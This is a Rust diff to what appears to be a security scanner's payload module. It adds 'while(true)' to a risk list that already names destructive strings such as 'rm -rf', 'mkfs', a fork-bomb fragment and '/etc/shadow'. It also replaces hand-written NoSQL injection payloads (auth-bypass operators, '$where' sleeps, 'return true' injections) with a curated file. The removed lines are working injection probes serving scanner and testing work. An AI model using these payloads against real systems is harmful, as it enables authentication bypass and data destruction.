@@ -158,6 +158,8 @@ fn classify_risk(default: PayloadRisk, payload: &str) -> PayloadRisk {
         // command / RCE
         "expect://", "rm -rf", "rm -r ", "mkfs", "shutdown", "reboot", "> /dev/sd",
         "dd if=", ":(){", "/etc/shadow",
+        // unbounded DoS ($where infinite loops) — bounded sleeps stay Invasive
+        "while(true)",
     ];
     if DESTRUCTIVE.iter().any(|needle| p.contains(needle)) {
         PayloadRisk::Destructive
@@ -179,25 +181,7 @@ pub fn traversal_table() -> PayloadTable { PayloadTable::from_curated("traversal
 pub fn xxe_table()       -> PayloadTable { PayloadTable::from_curated("xxe",       PayloadCategory::Xxe,              PayloadRisk::Invasive,   include_str!("payload_data/xxe.json")) }
 pub fn ssrf_table()      -> PayloadTable { PayloadTable::from_curated("ssrf",      PayloadCategory::Ssrf,             PayloadRisk::Safe,       include_str!("payload_data/ssrf.json")) }
 pub fn proto_pollution_table() -> PayloadTable { PayloadTable::from_curated("prototype_pollution", PayloadCategory::PrototypePollution, PayloadRisk::Invasive, include_str!("payload_data/prototype_pollution.json")) }
-
-pub fn nosqli_table()    -> PayloadTable { PayloadTable::from_legacy("nosqli",  PayloadCategory::NoSqli, PayloadRisk::Invasive, NOSQLI_PAYLOADS) }
-
-/// Classic NoSQL injection probes (no curated corpus — hand-written).
-pub const NOSQLI_PAYLOADS: &[&str] = &[
-    "{\"$gt\": \"\"}",
-    "{\"$ne\": null}",
-    "{\"$where\": \"sleep(5000)\"}",
-    "{\"$regex\": \".*\"}",
-    "{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}",
-    "username[$ne]=&password[$ne]=",
-    "{\"username\": {\"$gt\":\"\"}, \"password\": {\"$gt\":\"\"}}",
-    "{\"$or\": [{}, {}]}",
-    "true, $or: [ {}, { 'a':'a' } ]",
-    "0;return true",
-    "1;return true",
-    "';return true;var foo='",
-    "\";return true;var foo=\"",
-];
+pub fn nosqli_table()    -> PayloadTable { PayloadTable::from_curated("nosqli",    PayloadCategory::NoSqli,           PayloadRisk::Invasive,   include_str!("payload_data/nosqli.json")) }
 
 #[cfg(test)]
 mod tests {
@@ -208,6 +192,7 @@ mod tests {
         let tables = [
             sqli_table(), xss_table(), ssti_table(), cmd_table(),
             traversal_table(), xxe_table(), ssrf_table(), proto_pollution_table(),
+            nosqli_table(),
         ];
         for t in &tables {
             assert!(!t.is_empty(), "{} parsed empty", t.name);
